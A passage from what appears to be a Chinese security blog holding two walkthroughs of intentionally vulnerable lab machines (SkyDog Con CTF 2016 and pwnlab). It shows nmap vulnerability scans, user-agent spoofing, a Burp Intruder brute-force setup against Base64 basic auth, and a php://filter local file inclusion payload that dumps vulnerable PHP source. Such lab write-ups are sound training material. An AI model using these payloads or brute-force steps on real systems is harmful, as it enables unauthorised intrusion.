class="symbol">%29</span><span class="symbol">%3</span>ay<span class="symbol">%5</span>bc<span class="symbol">%5</span>d<span class="symbol">%2</span>epush<span class="symbol">%28</span>l<span class="symbol">%29</span><span class="symbol">%29</span><span class="symbol">%7</span>dfunction=<span class="symbol">%27</span><span class="symbol">%20</span>OR<span class="symbol">%20</span>sqlspider</span><br><span class="line">|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.</span><br><span class="line"><span class="number">443</span>/tcp open   https</span><br><span class="line">|_http-csrf: Couldn't find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn't find any DOM based XSS.</span><br><span class="line">| http-slowloris-check:</span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|       Slowloris tries <span class="keyword">to</span> keep many connections <span class="keyword">to</span> the <span class="keyword">target</span> web server open <span class="keyword">and</span> hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections <span class="keyword">to</span></span><br><span class="line">|       the <span class="keyword">target</span> web server <span class="keyword">and</span> sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server's resources causing Denial Of Service.</span><br><span class="line">|</span><br><span class="line">|     Disclosure date: <span class="number">2009</span><span class="number">-09</span><span class="number">-17</span></span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">| http-sql-injection:</span><br><span class="line">|   Possible sqli for queries:</span><br><span class="line">|_    https://skydogconctf<span class="number">2016</span>/assets/js/<span class="keyword">c</span>,l.<span class="keyword">type</span>=a),l.width=l.height=<span class="symbol">%220</span><span class="symbol">%22</span>,l.onerror=l.onload=l.onreadystatechange=function()<span class="symbol">%7</span>bk.<span class="keyword">call</span>(this,r)<span class="symbol">%7</span>d,p.splice(e,<span class="number">0</span>,u),<span class="symbol">%22</span>img<span class="symbol">%22</span>!=a&amp;&amp;(r<span class="symbol">%7</span><span class="keyword">c</span><span class="symbol">%7</span><span class="keyword">c</span><span class="number">2</span>===y<span class="symbol">%5</span>bc<span class="symbol">%5</span>d?<span class="symbol">%28</span>t<span class="symbol">%2</span>einsertBefore<span class="symbol">%28</span>l<span class="symbol">%2</span>cs<span class="symbol">%3</span>fnull<span class="symbol">%3</span>an<span class="symbol">%29</span><span class="symbol">%2</span>cm<span class="symbol">%28</span>k<span class="symbol">%2</span>cj<span class="symbol">%29</span><span class="symbol">%29</span><span class="symbol">%3</span>ay<span class="symbol">%5</span>bc<span class="symbol">%5</span>d<span class="symbol">%2</span>epush<span class="symbol">%28</span>l<span class="symbol">%29</span><span class="symbol">%29</span><span class="symbol">%7</span>dfunction=<span class="symbol">%27</span><span class="symbol">%20</span>OR<span class="symbol">%20</span>sqlspider</span><br><span class="line">|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.</span><br><span class="line">|_sslv<span class="number">2</span>-drown:</span><br></pre></td></tr></table></figure>

<p>发现一个点</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">http-sql-<span class="string">injection:</span> </span><br><span class="line">Possible sqli <span class="keyword">for</span> <span class="string">queries:</span></span><br></pre></td></tr></table></figure>

<p>看来应该存在sql注入</p>
<p>3、进入服务器网页</p>
<p><img src="/assets/image-20180602100404515-1588777753200.png" alt="image-20180602100404515"></p>
<p>浏览下网页，发现下面有提示</p>
<p><img src="/assets/image-20180602100539377-1588777753201.png" alt="image-20180602100539377">4、获取flag</p>
<p>(1)第一个flag</p>
<p>根据上图的提示，不要去home,home中有一个十六进制。那么去Home试试。</p>
<p>/home</p>
<p>发现home根本不存在。</p>
<p>用zap扫一下网站，发现网站下有两个目录，一个是assets,一个是oldIE,有了以前的经验教训就先找oldIE,然后发现下面只有一个文件html5.js，打开后发现最上面醒目的标识着一个注释。</p>
<p><img src="/assets/image-20180602103843825-1588777753202.png" alt="image-20180602103843825"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">666</span>c61677b37633031333230373061306566373164353432363633653964633166356465657d</span><br></pre></td></tr></table></figure>

<p>用十六机制转ASCII码解码得：</p>
<p>flag{7c0132070a0ef71d542663e9dc1f5dee}</p>
<p>（2）第二个flag</p>
<p>那第二个flag该怎么找呢？第二个那个flag提示相当于没有什么提示。一般这种题目后面个flag需要靠前面个flag寻找过程的帮助，但是前面个没有任何提示信息。怎么办？观察下flag里面的字符恰好是32位。</p>
<p>7c0132070a0ef71d542663e9dc1f5dee用md5解码后为nmap。</p>
<p>意思提示用nmap，可是刚刚已经扫过了一次，难道是先前没扫全？</p>
<p>重新扫一次</p>
<p>nmap -A 192.168.43.248</p>
<p>发现还是没有什么信息</p>
<p>那看一下端口吧,为了快速分为两次扫描</p>
<p>nmap -p 1000-20000 192.168.43.248</p>
<p>没有</p>
<p>nmap -sV -p 20000-65535 192.168.43.248</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">22222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br></pre></td></tr></table></figure>

<p>发现开了22222端口，而且服务是ssh服务，</p>
<p>连接试一下看看有没有弱密码：</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">windows7phone% ssh -p <span class="number">22222</span> root@<span class="number">192.168</span><span class="number">.43</span><span class="number">.248</span></span><br><span class="line">The authenticity <span class="keyword">of</span> host '[<span class="number">192.168</span><span class="number">.43</span><span class="number">.248</span>]:<span class="number">22222</span> ([<span class="number">192.168</span><span class="number">.43</span><span class="number">.248</span>]:<span class="number">22222</span>)' can't be established.</span><br><span class="line">ECDSA key fingerprint <span class="keyword">is</span> SHA256:DeCMZ74o5wesBHFLyaVY7UTCA7mW+bx6WroHm6AgMqU.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added '[<span class="number">192.168</span><span class="number">.43</span><span class="number">.248</span>]:<span class="number">22222</span>' (ECDSA) <span class="keyword">to</span> <span class="keyword">the</span> <span class="built_in">list</span> <span class="keyword">of</span> known hosts.</span><br><span class="line"></span><br><span class="line"><span class="comment">###### #</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WARNING</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FBI - Authorized access only!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disconnect IMMEDIATELY if you are not an authorized user!!!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># All actions Will be monitored and recorded</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Flag&#123;53c82eba31f6d416f331de9162ebe997&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###### #</span></span><br></pre></td></tr></table></figure>

<p>结果直接弹出flag了，第二个flag get.Flag{53c82eba31f6d416f331de9162ebe997}</p>
<p>(3)第三个flag</p>
<p>有了先前的经验把第二个flag的值用md5解密后得encrypt</p>
<p>看来第三关是加密。再看看最先前的提示：“During his Travels Frank has Been Known to Intercept Traffic”</p>
<p>意思不安全，有人可以窃听流量。意思用http不安全？</p>
<p>那用https试下</p>
<p>发现证书错误,看一下证书,发现证书中没有flag，看了下解密不太可能。</p>
<p>于是看下是否还有其他可以利用的信息。</p>
<p>点击把证书添加例外后发现可以查看证书状态：</p>
<p><img src="/assets/image-20180602114356663-1588777753202.png" alt="image-20180602114356663"></p>
<p>点击进去看下。惊奇的发现里面有flag</p>
<p><img src="/assets/image-20180602114422355-1588777753202.png" alt="image-20180602114422355"></p>
<p>flag3{f82366a9ddc064585d54e3f78bde3221}</p>
<p>（4）第四个flag</p>
<p>再次解密上面的flag得到personnel,又结合提示“A Good Agent is Hard to Find”。看来是要改代理。可是personnel是为什么？难道是要代理改为全体人员吗？试了半天无果。于是又想这个单词会不会是个目录，输入/personnel,结果：</p>
<p><img src="/assets/image-20180602114948886-1588777753203.png" alt="image-20180602114948886"></p>
<p>拒绝访问，要FBI机构的。那怎么才是FBI机构的呢？在其他文件中找找线索。目前已知的好像只有html5.js和assets文件。</p>
<p>回到刚刚的html5.js文件查询FBI字符串发现：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/* maindev -  6/</span><span class="number">7</span><span class="regexp">/02 Adding temporary support for IE4 FBI Workstations */</span></span><br><span class="line"><span class="regexp">/* newmaindev -  5/</span><span class="number">22</span><span class="regexp">/16 Last maindev was and idoit and IE4 is still Gold image -@Support doug.perterson@fbi.gov */</span></span><br></pre></td></tr></table></figure>

<p>意思是使用IE4？</p>
<p>网上搜一下IE4版本的IE，在<a href="http://www.966266.com/jishu/ie-user-agent.html这个网站找到" target="_blank" rel="noopener">http://www.966266.com/jishu/ie-user-agent.html这个网站找到</a></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">**Internet Explorer <span class="number">4.0</span>**</span><br><span class="line"></span><br><span class="line">Mozilla/<span class="number">4.0</span> WebTV/<span class="number">2.6</span> (compatible; MSIE <span class="number">4.0</span>)</span><br><span class="line"></span><br><span class="line">Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">4.0</span>; Windows NT)</span><br><span class="line"></span><br><span class="line">Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">4.0</span>; Windows <span class="number">98</span> )</span><br><span class="line"></span><br><span class="line">Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">4.0</span>; Windows <span class="number">95</span>; .NET CLR <span class="number">1.1</span><span class="number">.4322</span>; .NET CLR <span class="number">2.0</span><span class="number">.50727</span>)</span><br><span class="line"></span><br><span class="line">Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">4.0</span>; Windows <span class="number">95</span>)</span><br><span class="line"></span><br><span class="line">Mozilla/<span class="number">4.0</span> (Compatible; MSIE <span class="number">4.0</span>)</span><br><span class="line"></span><br><span class="line">Mozilla/<span class="number">2.0</span> (compatible; MSIE <span class="number">4.0</span>; Windows <span class="number">98</span>)</span><br></pre></td></tr></table></figure>

<p>随便选一个Mozilla/4.0 (compatible; MSIE 4.0; Windows 95; .NET CLR 1.1.4322; .NET CLR 2.0.50727)利用User Agent插件改代理。如何所示。</p>
<p><img src="/assets/image-20180603155953564-1588777753203.png" alt="image-20180603155953564"></p>
<p>再次访问/personnel成功进入</p>
<p><img src="/assets/image-20180603160105406-1588777753203.png" alt="image-20180603160105406"></p>
<p>现在该找flag了,可以看到在右下角很清楚的实现flag</p>
<p>flag{14e10d570047667f904261e6d08f520f} </p>
<p>（5）第5个flag</p>
<p>将第5个flag解码后得evidence,再根据下面的提示clue=new +flag和第5条提示 “The Devil is in the Details - Or is it Dialogue? Either Way,  if it’s Simple, Guessable, or Personal it Goes Against Best Practices”。</p>
<p>看了提示还是没太懂，意思是新的证据？想一下clue为newevidence，是不是又像上一次personnel那个一样呢？</p>
<p>输入/newevidence进入果真出现新界面</p>
<p><img src="/assets/image-20180603162606699-1588777753203.png" alt="image-20180603162606699"></p>
<p>要求输入用户和密码。用户名密码是什么呢？提示只有FBI的人才能访问。那么肯定是输入一个FBI的账号密码。而且提示又说的简单的、可猜的，猜想可能是弱口令。于是爆破吧，先试了一下admin和root爆破，均没成功。那么肯定问题在于如何确定用户名。</p>
<p>前面的html.js中给出了一个邮箱：<a href="mailto:doug.perterson@fbi.gov">doug.perterson@fbi.gov</a>,根据这个邮箱可以猜想是一个用户名。</p>
<p>用doug.perterson爆破无果。那再去第四关去寻找一下线索。</p>
<p><img src="/assets/image-20180603165015569-1588777753203.png" alt="image-20180603165015569"></p>
<p>仔细浏览才发现这是一个FBI探员的个人页面。而且上面写了Hanratty探员，那用Hanratty再爆破试试，还是不行。换种思路先前都是一个英文单词.一个英文单词。</p>
<p>那这次是不是账号也要一个单词.一个单词呢？Hanratty的姓是什么？google一下</p>
<p><img src="/assets/image-20180603165641329-1588777753204.png" alt="image-20180603165641329"></p>
<p>然后发现是部电影，而且这电影我还看过，是猫鼠游戏，因为当初看的是中文版，所以不知道它的英文名字叫Catch me if you can,所以一直没发现，现在终于知道这个靶机要做什么了，肯定是Hanratty要抓Frank，而Frank东躲西藏。Hanratty的姓是Carl。</p>
<p>因为不清楚是姓在前还是名在前于是查了下doug.perterson，发现也是名在前姓在后。<img src="/assets/image-20180603170045319-1588777753204.png" alt="image-20180603170045319"></p>
<p>于是利用carl.hanratty去爆破。</p>
<p>现在具体的讲爆破</p>
<p>先用burpsuit抓包,输入admin,123</p>
<p><img src="/assets/image-20180603170440593-1588777753204.png" alt="image-20180603170440593"></p>
<p>发现有一串密文，用Base64解码后为admin:123，看来是根据账户:密码然后base64加密。</p>
<p>将请求发送给burp的Intruder，然后在刚刚密文的地方点击左侧的add$，使其成为变量</p>
<p><img src="/assets/image-20180603171745363-1588777753204.png" alt="image-20180603171745363"></p>
<p>在payload下Payload Processing上添加base64编码方式</p>
<p><img src="/assets/image-20180603171824459-1588777753204.png" alt="image-20180603171824459"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnlab靶机测试</title>
    <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/pwnlab%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>一、探测ip</p>
<p>netdicover -i eth0</p>
<a id="more"></a>

<p>二、扫描ip</p>
<p>nmap -sV -A 192.168.43.18</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">windows7phone%</span> <span class="string">nmap</span> <span class="string">-sV</span> <span class="string">-A</span> <span class="number">192.168</span><span class="number">.43</span><span class="number">.18</span></span><br><span class="line"></span><br><span class="line"><span class="string">Starting</span> <span class="string">Nmap</span> <span class="number">7.50</span> <span class="string">(</span> <span class="string">https://nmap.org</span> <span class="string">)</span> <span class="string">at</span> <span class="number">2018</span><span class="number">-06</span><span class="number">-05</span> <span class="number">18</span><span class="string">:29</span> <span class="string">CST</span></span><br><span class="line"><span class="string">Nmap</span> <span class="string">scan</span> <span class="string">report</span> <span class="string">for</span> <span class="string">pwnlab</span> <span class="string">(192.168.43.18)</span></span><br><span class="line"><span class="string">Host</span> <span class="string">is</span> <span class="string">up</span> <span class="string">(0.00090s</span> <span class="string">latency).</span></span><br><span class="line"><span class="attr">Not shown:</span> <span class="number">997</span> <span class="string">filtered</span> <span class="string">ports</span></span><br><span class="line"><span class="string">PORT</span>     <span class="string">STATE</span> <span class="string">SERVICE</span> <span class="string">VERSION</span></span><br><span class="line"><span class="number">80</span><span class="string">/tcp</span>   <span class="string">open</span>  <span class="string">http</span>    <span class="string">Apache</span> <span class="string">httpd</span> <span class="number">2.4</span><span class="number">.10</span> <span class="string">((Debian))</span></span><br><span class="line"><span class="string">|_http-server-header:</span> <span class="string">Apache/2.4.10</span> <span class="string">(Debian)</span></span><br><span class="line"><span class="string">|_http-title:</span> <span class="string">PwnLab</span> <span class="string">Intranet</span> <span class="string">Image</span> <span class="string">Hosting</span></span><br><span class="line"><span class="number">111</span><span class="string">/tcp</span>  <span class="string">open</span>  <span class="string">rpcbind</span> <span class="number">2</span><span class="number">-4</span> <span class="string">(RPC</span> <span class="comment">#100000)</span></span><br><span class="line"><span class="string">|</span> <span class="attr">rpcinfo:</span></span><br><span class="line"><span class="string">|</span>   <span class="string">program</span> <span class="string">version</span>   <span class="string">port/proto</span>  <span class="string">service</span></span><br><span class="line"><span class="string">|</span>   <span class="number">100000</span>  <span class="number">2</span><span class="string">,3,4</span>        <span class="number">111</span><span class="string">/tcp</span>  <span class="string">rpcbind</span></span><br><span class="line"><span class="string">|</span>   <span class="number">100000</span>  <span class="number">2</span><span class="string">,3,4</span>        <span class="number">111</span><span class="string">/udp</span>  <span class="string">rpcbind</span></span><br><span class="line"><span class="string">|</span>   <span class="number">100024</span>  <span class="number">1</span>          <span class="number">49209</span><span class="string">/udp</span>  <span class="string">status</span></span><br><span class="line"><span class="string">|_</span>  <span class="number">100024</span>  <span class="number">1</span>          <span class="number">55138</span><span class="string">/tcp</span>  <span class="string">status</span></span><br><span class="line"><span class="number">3306</span><span class="string">/tcp</span> <span class="string">open</span>  <span class="string">mysql</span>   <span class="string">MySQL</span> <span class="number">5.5</span><span class="number">.47</span><span class="number">-0</span><span class="string">+deb8u1</span></span><br><span class="line"><span class="string">|</span> <span class="attr">mysql-info:</span></span><br><span class="line"><span class="string">|</span>   <span class="attr">Protocol:</span> <span class="number">10</span></span><br><span class="line"><span class="string">|</span>   <span class="attr">Version:</span> <span class="number">5.5</span><span class="number">.47</span><span class="number">-0</span><span class="string">+deb8u1</span></span><br><span class="line"><span class="string">|</span>   <span class="attr">Thread ID:</span> <span class="number">39</span></span><br><span class="line"><span class="string">|</span>   <span class="attr">Capabilities flags:</span> <span class="number">63487</span></span><br><span class="line"><span class="string">|</span>   <span class="attr">Some Capabilities:</span> <span class="string">Speaks41ProtocolNew,</span> <span class="string">IgnoreSigpipes,</span> <span class="string">IgnoreSpaceBeforeParenthesis,</span> <span class="string">Speaks41ProtocolOld,</span> <span class="string">FoundRows,</span> <span class="string">Support41Auth,</span> <span class="string">SupportsCompression,</span> <span class="string">ODBCClient,</span> <span class="string">SupportsTransactions,</span> <span class="string">InteractiveClient,</span> <span class="string">ConnectWithDatabase,</span> <span class="string">LongPassword,</span> <span class="string">SupportsLoadDataLocal,</span> <span class="string">DontAllowDatabaseTableColumn,</span> <span class="string">LongColumnFlag,</span> <span class="string">SupportsMultipleResults,</span> <span class="string">SupportsMultipleStatments,</span> <span class="string">SupportsAuthPlugins</span></span><br><span class="line"><span class="string">|</span>   <span class="attr">Status:</span> <span class="string">Autocommit</span></span><br><span class="line"><span class="string">|</span>   <span class="attr">Salt:</span> <span class="string">W&gt;p9j*1WB#*GfK%uA$0b</span></span><br><span class="line"><span class="string">|_</span>  <span class="attr">Auth Plugin Name:</span> <span class="number">88</span></span><br></pre></td></tr></table></figure>

<p> nmap –script=vuln 192.168.43.18</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">Starting Nmap <span class="number">7.50</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2018</span><span class="number">-06</span><span class="number">-05</span> <span class="number">18</span>:<span class="number">30</span> CST</span><br><span class="line"></span><br><span class="line">Pre-scan script results:</span><br><span class="line"></span><br><span class="line">| <span class="type">broadcast</span>-avahi-dos:</span><br><span class="line"></span><br><span class="line">|   <span class="type">Discovered</span> hosts:</span><br><span class="line"></span><br><span class="line">|     <span class="type">224</span><span class="number">.0</span><span class="number">.0</span><span class="number">.251</span></span><br><span class="line"></span><br><span class="line">|   <span class="type">After</span> NULL UDP avahi packet DoS (CVE<span class="number">-2011</span><span class="number">-1002</span>).</span><br><span class="line"></span><br><span class="line">|<span class="type">_</span>  Hosts are all up (not vulnerable).</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> pwnlab (<span class="number">192.168</span><span class="number">.43</span><span class="number">.18</span>)</span><br><span class="line"></span><br><span class="line">Host is up (<span class="number">0.00082</span>s latency).</span><br><span class="line"></span><br><span class="line">Not shown: <span class="number">997</span> filtered ports</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"></span><br><span class="line"><span class="number">80</span>/tcp   open  http</span><br><span class="line"></span><br><span class="line">| <span class="type">http</span>-csrf:</span><br><span class="line"></span><br><span class="line">| <span class="type">Spidering</span> limited to: maxdepth=<span class="number">3</span>; maxpagecount=<span class="number">20</span>; withinhost=pwnlab</span><br><span class="line"></span><br><span class="line">|   <span class="type">Found</span> the following possible CSRF vulnerabilities:</span><br><span class="line"></span><br><span class="line">|<span class="type"></span></span><br><span class="line"><span class="type"></span></span><br><span class="line"><span class="type">|     Path</span>: http://pwnlab/?page=login</span><br><span class="line"></span><br><span class="line">|     <span class="type">Form</span> id: user</span><br><span class="line"></span><br><span class="line">|<span class="type">_</span>    Form action:</span><br><span class="line"></span><br><span class="line">|<span class="type">_http</span>-dombased-xss: Couldn't find any DOM based XSS.</span><br><span class="line"></span><br><span class="line">| <span class="type">http</span>-enum:</span><br><span class="line"></span><br><span class="line">|   <span class="type">/login</span>.php: Possible admin folder</span><br><span class="line"></span><br><span class="line">|   <span class="type">/images</span>/: Potentially interesting directory w/ listing on 'apache/<span class="number">2.4</span><span class="number">.10</span> (debian)'</span><br><span class="line"></span><br><span class="line">|<span class="type">_</span>  /upload/: Potentially interesting directory w/ listing on 'apache/<span class="number">2.4</span><span class="number">.10</span> (debian)'</span><br><span class="line"></span><br><span class="line">| <span class="type">http</span>-internal-ip-disclosure:</span><br><span class="line"></span><br><span class="line">|<span class="type">_</span>  Internal IP Leaked: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">| <span class="type">http</span>-slowloris-check:</span><br><span class="line"></span><br><span class="line">|   <span class="type">VULNERABLE</span>:</span><br><span class="line">|   <span class="type">Slowloris</span> DOS attack</span><br><span class="line">|     <span class="type">State</span>: LIKELY VULNERABLE</span><br><span class="line">|     <span class="type">IDs</span>:  CVE:CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|       <span class="type">Slowloris</span> tries to keep many connections to the target web server open and hold</span><br><span class="line">|       <span class="type">them</span> open <span class="built_in">as</span> long <span class="built_in">as</span> possible.  It accomplishes this <span class="built_in">by</span> opening connections to</span><br><span class="line">|       <span class="type">the</span> target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       <span class="type">the</span> http server's resources causing Denial Of Service.</span><br><span class="line">|<span class="type"></span></span><br><span class="line"><span class="type">|     Disclosure</span> date: <span class="number">2009</span><span class="number">-09</span><span class="number">-17</span></span><br><span class="line">|     <span class="type">References</span>:</span><br><span class="line">|       <span class="type">http</span>://ha.ckers.org/slowloris/</span><br><span class="line">|<span class="type">_</span>      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|<span class="type">_http</span>-stored-xss: Couldn't find any stored XSS vulnerabilities.</span><br><span class="line">|<span class="type">_http</span>-vuln-cve2017<span class="number">-1001000</span>: ERROR: <span class="keyword">Script</span> execution failed (use -d to debug)</span><br><span class="line"><span class="number">111</span>/tcp  open  rpcbind</span><br><span class="line"><span class="number">3306</span>/tcp open  mysql</span><br></pre></td></tr></table></figure>

<p>发现开放了80、111、3306端口，</p>
<p>二、点击登录页面</p>
<p>发现页面url为:<a href="http://192.168.43.18/?page=login" target="_blank" rel="noopener">http://192.168.43.18/?page=login</a></p>
<p>page=login，比较敏感。可能是LFI</p>
<p>看下源代码:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))</span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">include</span>($_GET[<span class="string">'page'</span>].<span class="string">".php"</span>);</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">else</span></span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">"Use this server to upload and share image files inside the intranet"</span>;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>真的是文件包含，</p>
<p>通过测试发现下面payload有效：</p>
<p><a href="http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=index" target="_blank" rel="noopener">http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=index</a></p>
<p>页面显示字符串：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">PD<span class="number">9</span>waHANC<span class="keyword">i8</span>vTXVsdGlsaW<span class="number">5</span>ndWFsLiBOb<span class="number">3</span>QgaW<span class="number">1</span>wbGVtZW<span class="number">50</span>ZWQgeWV<span class="number">0</span>Lg<span class="number">0</span>KLy<span class="number">9</span>zZXRjb<span class="number">29</span>raWUoImxhbmciLCJlb<span class="keyword">i5</span>sYW<span class="number">5</span>nLnBocCIpOw<span class="number">0</span>KaWYgKGlzc<span class="number">2</span>V<span class="number">0</span>KCRfQ<span class="number">09</span>PS<span class="number">0</span>lFWydsYW<span class="number">5</span>nJ<span class="number">10</span>pKQ<span class="number">0</span>Kew<span class="number">0</span>KCWluY<span class="number">2</span><span class="keyword">x</span><span class="number">1</span>ZGUoImxhbmcvI<span class="keyword">i4</span>kX<span class="number">0</span>NPT<span class="number">0</span>tJRVsnbGFuZyddKTsNCn<span class="number">0</span>NC<span class="keyword">i8</span>vIE<span class="number">5</span>vdCBpbXBsZW<span class="number">1</span>lbnRlZCB<span class="number">5</span>ZXQuDQo/Pg<span class="number">0</span>KPGh<span class="number">0</span>bWw+DQo<span class="number">8</span>aGVhZD<span class="number">4</span>NCjx<span class="number">0</span>aXRsZT<span class="number">5</span>Qd<span class="number">25</span>MYWIgSW<span class="number">50</span>cmFuZXQgSW<span class="number">1</span>hZ<span class="number">2</span>UgSG<span class="number">9</span>zdGluZzwvdGl<span class="number">0</span>bGU+DQo<span class="number">8</span>L<span class="number">2</span>hlYWQ+DQo<span class="number">8</span>Ym<span class="number">9</span>keT<span class="number">4</span>NCjxjZW<span class="number">50</span>ZXI+DQo<span class="number">8</span>aW<span class="number">1</span>nIHNyYz<span class="number">0</span>iaW<span class="number">1</span>hZ<span class="number">2</span>VzL<span class="number">3</span>B<span class="number">3</span>bmxhY<span class="keyword">i5</span>wbmciPjxiciAvPg<span class="number">0</span>KWyA<span class="number">8</span>YSBocmVmPSIvIj<span class="number">5</span>Ib<span class="number">21</span>lPC<span class="number">9</span>hPiBdIFsgPGEgaHJlZj<span class="number">0</span>iP<span class="number">3</span>BhZ<span class="number">2</span>U<span class="number">9</span>bG<span class="number">9</span>naW<span class="number">4</span>iPkxvZ<span class="number">2</span>luPC<span class="number">9</span>hPiBdIFsgPGEgaHJlZj<span class="number">0</span>iP<span class="number">3</span>BhZ<span class="number">2</span>U<span class="number">9</span>dXBsb<span class="number">2</span>FkIj<span class="number">5</span>VcGxvYWQ<span class="number">8</span>L<span class="number">2</span>E+IF<span class="number">0</span>NCjxoc<span class="keyword">i8</span>+PGJyLz<span class="number">4</span>NCjw/cGhwDQoJaWYgKGlzc<span class="number">2</span>V<span class="number">0</span>KCRfR<span class="number">0</span>VUWydwYWdlJ<span class="number">10</span>pKQ<span class="number">0</span>KCXsNCgkJaW<span class="number">5</span>jbHVkZSgkX<span class="number">0</span>dFVFsncGFnZSddLiIucGhwIik<span class="number">7</span>DQoJfQ<span class="number">0</span>KCWVsc<span class="number">2</span>UNCgl<span class="number">7</span>DQoJCWVjaG<span class="number">8</span>gIlVzZSB<span class="number">0</span>aGlzIHNlcnZlciB<span class="number">0</span>byB<span class="number">1</span>cGxvYWQgYW<span class="number">5</span>kIHNoYXJlIGltYWdlIGZpbGVzIGluc<span class="number">2</span>lkZSB<span class="number">0</span>aGUgaW<span class="number">50</span>cmFuZXQiOw<span class="number">0</span>KCX<span class="number">0</span>NCj<span class="number">8</span>+DQo<span class="number">8</span>L<span class="number">2</span>NlbnRlcj<span class="number">4</span>NCjwvYm<span class="number">9</span>keT<span class="number">4</span>NCjwvaHRtbD<span class="number">4</span>=</span><br></pre></td></tr></table></figure>

<p>用base64解密后：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//Multilingual. Not implemented yet.</span></span></span><br><span class="line"><span class="php"><span class="comment">//setcookie("lang","en.lang.php");</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lang'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">include</span>(<span class="string">"lang/"</span>.$_COOKIE[<span class="string">'lang'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// Not implemented yet.</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>PwnLab Intranet Image Hosting<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/pwnlab.png"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">[ <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span> ] [ <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=login"</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">a</span>&gt;</span> ] [ <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span 